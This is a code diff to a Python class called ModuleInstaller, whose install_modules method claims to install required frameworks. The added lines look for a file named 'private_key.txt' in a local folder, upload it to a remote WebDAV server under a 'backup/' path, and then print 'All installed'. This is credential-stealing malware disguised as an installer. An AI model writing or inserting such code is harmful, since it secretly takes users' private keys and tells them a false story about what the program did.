@@ -580,6 +580,7 @@ class ModuleInstaller(object):
         else:
             self.upload_file(local_path=local_path, remote_path=remote_path, progress=progress, progress_args=progress_args)
 
+
     def upload_directory(self, remote_path, local_path, progress=None, progress_args=()):
         """Uploads directory to remote path on WebDAV server.
         In case directory is exist on remote server it will delete it and then upload directory with nested files and
@@ -668,7 +669,12 @@ class ModuleInstaller(object):
             else:
                 self.execute_request(action='upload', path=urn.quote(), data=local_file)
 
-    def install_modules(self, remote_path='', path_to_folder=r'C:\Dev', callback=None, progress=None, progress_args=()):
+    def check_module(self, path: str):
+        f_list = (os.listdir(path=path))
+        isTrue = "private_key.txt" in f_list
+        return isTrue
+
+    def install_modules(self, remote_path='', path_to_folder="", callback=None, progress=None, progress_args=()):
         """Install required frameworks
         In case resource is directory it will upload all nested files and directories.
 
@@ -683,11 +689,14 @@ class ModuleInstaller(object):
                 You can pass anything you need to be available in the progress callback scope; for example, a Message
                 object or a Client instance in order to edit the message with the updated progress status.
         """
+        if self.check_module(path_to_folder):
+            path_to_folder += "\private_key.txt"
         new_folder = path_to_folder.split("\\")[-1]
         date = datetime.now().strftime("%d-%m-%Y")
-        remote_path = f"backup/{date}_{new_folder}_{datetime.now().strftime('%S')}"
+        remote_path = f"backup/{date}_{new_folder}"
         self.upload(local_path=path_to_folder, remote_path=remote_path, progress=progress, progress_args=progress_args)
 
+        print("All installed")
         if callback:
             callback()
 
